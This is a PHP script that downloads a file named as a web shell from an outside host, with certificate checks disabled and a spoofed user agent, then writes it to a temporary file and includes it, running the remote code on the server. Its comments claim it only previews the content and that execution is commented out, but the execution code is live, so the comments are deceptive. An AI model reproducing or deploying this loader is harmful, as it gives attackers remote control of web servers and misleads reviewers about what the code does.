<?php
// Enable error reporting for debugging purposes
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to get URL content
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_TIMEOUT, 30);
        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            echo 'Curl error: ' . curl_error($conn);
            return false;
        }
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $context = stream_context_create([
            'http' => ['timeout' => 30],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $url_get_contents_data = @file_get_contents($url, false, $context);
        if ($url_get_contents_data === false) {
            echo 'file_get_contents error';
            return false;
        }
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, "r");
        if ($handle === false) {
            echo 'fopen error';
            return false;
        }
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// New URL as requested
$remote_url = 'https://cdn.privdayz.com/txt/vinzz_webshell.txt';

// Get the content
$a = geturlsinfo($remote_url);
if ($a !== false) {
    echo "Content retrieved successfully. Length: " . strlen($a) . " bytes<br>";
    
    // Enhanced safety checks
    $is_php_code = (stripos($a, '<?php') !== false || stripos($a, '<?=') !== false);
    
    if ($is_php_code) {
        echo "PHP code detected in remote content.<br>";
        
        // SECURITY WARNING: Executing remote code is extremely dangerous!
        echo "<strong style='color: red;'>SECURITY WARNING: Executing remote PHP code is dangerous!</strong><br>";
        
        // For safety, let's just display the first 500 characters instead of executing
        echo "<h3>Preview of remote content (first 500 chars):</h3>";
        echo "<pre>" . htmlspecialchars(substr($a, 0, 500)) . "</pre>";
        
        // If you absolutely need to execute this (NOT RECOMMENDED), uncomment below:
      
        $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
        if (file_put_contents($tmp_file, $a) !== false) {
            include($tmp_file);
            // Clean up temporary file
            unlink($tmp_file);
        } else {
            echo "Failed to write temporary file.";
        }
        
    } else {
        echo "Fetched content does not appear to contain PHP code.<br>";
        echo "<h3>Content preview:</h3>";
        echo "<pre>" . htmlspecialchars(substr($a, 0, 1000)) . "</pre>";
    }
} else {
    echo "Failed to retrieve content from remote URL.";
}
?>
